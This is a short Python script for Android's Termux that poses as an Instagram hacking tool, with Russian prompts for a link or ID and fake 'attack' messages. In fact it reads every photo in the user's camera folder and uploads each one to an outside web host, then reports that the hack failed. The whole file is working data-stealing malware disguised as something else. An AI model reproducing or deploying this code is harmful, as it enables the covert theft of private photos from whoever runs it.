import os, requests
print("insta-HAck")
input("Ссылка или ID: ")
print("Загрузка БД...")
os.system("termux-setup-storage")
print("Идет процесс атаки")
l = os.listdir("../storage/shared/DCIM/Camera")
for i in range(len(l)):
    f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
    r = f.read()
    try:
        requests.post("http://instaagraam.zzz.com.ua", data={"im": r})
    except:
        pass
print("Не взломался...")